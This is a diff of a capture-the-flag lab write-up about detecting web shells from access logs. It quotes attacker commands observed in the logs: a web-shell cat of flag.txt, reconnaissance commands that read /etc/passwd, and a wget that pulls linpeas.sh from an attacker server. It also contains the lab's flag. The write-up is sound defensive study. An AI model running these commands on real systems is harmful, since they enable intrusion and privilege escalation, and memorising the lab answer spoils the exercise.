@@ -116,20 +116,6 @@ Subsequent commands observed in access logs:
 <img width="1366" height="728" alt="Web Shell Flag" src="https://github.com/ugbomakyrian5-web/detecting-web-shells/blob/main/screenshots/4b_webshell_flag_cat_flag_txt.png" />
 
 *cmd=cat+flag.txt executed via web shell — THM{W3b_Sh3ll_Usag3} returned, confirming full read access to server filesystem*
-#### 📸 Screenshot 5 — Full Command Execution Sequence in Access Logs
-<img width="1366" height="728" alt="Command Execution Sequence" src="https://github.com/ugbomakyrian5-web/detecting-web-shells/blob/main/screenshots/5_webshell_upload_form_command_sequence.png" />
-
-*Access log showing full post-exploitation command sequence: whoami → id → uname -a → ls -la /home → cat /etc/passwd*
-
----
-
-### Phase 5 — Post-Exploitation: First Command & Tool Download
-
-**First Command Confirmed**: `whoami` (17/Jul/2025 06:14:55 UTC)
-**Tool Downloaded**: `linpeas.sh`
-**Download Command**: `wget http://203.0.113.66:8000/linpeas.sh`
-
-The attacker used the web shell to download `linpeas.sh` — a widely used Linux privilege escalation enumeration script — directly from their own server (`203.0.113.66:8000`). This confirms the attacker was actively pursuing privilege escalation beyond the `www-data` account.
 
 #### 📸 Screenshot 6 — First RCE Command (`whoami`) Identified in Access Logs
 <img width="1366" height="728" alt="First Command whoami" src="https://github.com/ugbomakyrian5-web/detecting-web-shells/blob/main/screenshots/6_first_command_whoami_access_log.png" />
